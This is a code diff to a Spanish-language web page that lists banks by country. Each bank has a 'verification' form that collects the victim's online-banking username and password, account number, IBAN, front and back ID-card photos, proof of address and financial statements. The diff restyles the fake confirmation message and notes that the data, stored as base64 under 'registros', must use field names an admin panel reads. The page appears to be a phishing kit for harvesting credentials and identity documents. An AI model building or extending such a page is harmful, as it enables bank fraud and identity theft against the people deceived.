@@ -13,6 +13,7 @@
     .accordion-content { display: none; padding: 15px; }
     label { display: block; margin-top: 10px; }
     button { margin-top: 15px; padding: 10px 20px; background: #003366; color: #fff; border: none; border-radius: 5px; cursor: pointer; }
+    #confirmationBox { display:none; background:#cce5ff; padding:15px; margin:20px; text-align:center; }
   </style>
 </head>
 <body>
@@ -25,7 +26,7 @@
 
 <div id="accordionList"></div>
 
-<div id="confirmationBox" style="display:none; background:#cce5ff; padding:15px; margin:20px; text-align:center;">
+<div id="confirmationBox">
   ✔ Datos enviados correctamente
 </div>
 
@@ -43,18 +44,43 @@ bancosIBAN.forEach(item => {
     <div class="accordion-header">${item.pais} - ${item.banco}</div>
     <div class="accordion-content">
       <form onsubmit="guardarDatos(event)">
-        <label>Usuario: <input type="text" name="usuario" required></label>
-        <label>Contraseña: <input type="password" name="password" required></label>
-        <label>Cuenta principal: <input type="text" name="cuenta" required></label>
-        <label>IBAN: <input type="text" name="iban" required></label>
-        <label>Foto carnet (frontal): <input type="file" name="frontal" accept="image/*" required></label>
-        <label>Foto carnet (trasera): <input type="file" name="trasera" accept="image/*" required></label>
-        <label>Comprobante de domicilio: <input type="file" name="domicilio" accept="image/*,application/pdf" required></label>
-        <label>Justificantes financieros: <input type="file" name="finanzas" accept="image/*,application/pdf" required></label>
+        <label>Usuario:
+          <input type="text" name="usuario" required>
+        </label>
+
+        <label>Contraseña:
+          <input type="password" name="password" required>
+        </label>
+
+        <label>Cuenta principal:
+          <input type="text" name="cuenta" required>
+        </label>
+
+        <label>IBAN:
+          <input type="text" name="iban" required>
+        </label>
+
+        <label>Foto carnet (frontal):
+          <input type="file" name="frontal" accept="image/*" required>
+        </label>
+
+        <label>Foto carnet (trasera):
+          <input type="file" name="trasera" accept="image/*" required>
+        </label>
+
+        <label>Comprobante de domicilio:
+          <input type="file" name="domicilio" accept="image/*,application/pdf" required>
+        </label>
+
+        <label>Justificantes financieros:
+          <input type="file" name="finanzas" accept="image/*,application/pdf" required>
+        </label>
+
         <button type="submit">Verificar</button>
       </form>
     </div>
   `;
+
   acc.style.display = destacados.includes(item.pais) ? "" : "none";
   accordionList.appendChild(acc);
 });
@@ -85,12 +111,14 @@ function fileToBase64(file) {
   });
 }
 
-// Guardar datos
+// GUARDAR DATOS EN LOCALSTORAGE (clave: "registros")
 async function guardarDatos(event) {
   event.preventDefault();
+
   const form = event.target;
   const header = form.closest(".accordion").querySelector(".accordion-header").textContent;
 
+  // OBLIGATORIO: usar los mismos name que luego lee admin
   const frontal = await fileToBase64(form.frontal.files[0]);
   const trasera = await fileToBase64(form.trasera.files[0]);
   const domicilio = await fileToBase64(form.domicilio.files[0]);
